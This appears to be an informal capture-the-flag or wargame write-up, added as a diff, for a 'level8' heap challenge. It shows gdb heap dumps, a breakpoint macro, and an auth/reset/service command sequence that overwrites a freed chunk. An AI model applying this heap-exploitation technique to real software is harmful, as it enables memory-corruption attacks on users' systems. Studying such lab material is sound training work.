@@ -1,0 +1,52 @@
+we can exploit once again heap
+
+
+gdb ./level8
+
+auth admin
+
+(gdb)info proc mappings
+
+(gdb) x/20wx 0x804a000
+0x804a000:	0x00000000	0x00000011	0x696d6461	0x00000a6e
+0x804a010:	0x00000000	0x00020ff1	0x00000000	0x00000000
+0x804a020:	0x00000000	0x00000000	0x00000000	0x00000000
+0x804a030:	0x00000000	0x00000000	0x00000000	0x00000000
+0x804a040:	0x00000000	0x00000000	0x00000000	0x00000000
+
+
+we can see that our mallocated zone contain our strings
+
+
+lets see what happens with reset -> 
+
+
+we do a macro for this before
+
+command
+echo ---heap----------------
+x/20wx 0x804a000
+echo ---------------------
+continue
+end
+
+put a breakpoint on printf
+
+then call reset
+Breakpoint 1, 0x08048591 in main ()
+0x804a000:	0x00000000	0x00000011	0x00000000	0x00000a6e
+0x804a010:	0x00000000	0x00020ff1	0x00000000	0x00000000
+0x804a020:	0x00000000	0x00000000	0x00000000	0x00000000
+0x804a030:	0x00000000	0x00000000	0x00000000	0x00000000
+0x804a040:	0x00000000	0x00000000	0x00000000	0x00000000
+
+
+mallocated auth is now 0
+
+auth login
+service AAA
+service BBB
+
+we can see that it overwrite where auth
+gg
+the malloc(4) is sizeup for alignmenent to 8 but it should be 36 so we can overwrite easy
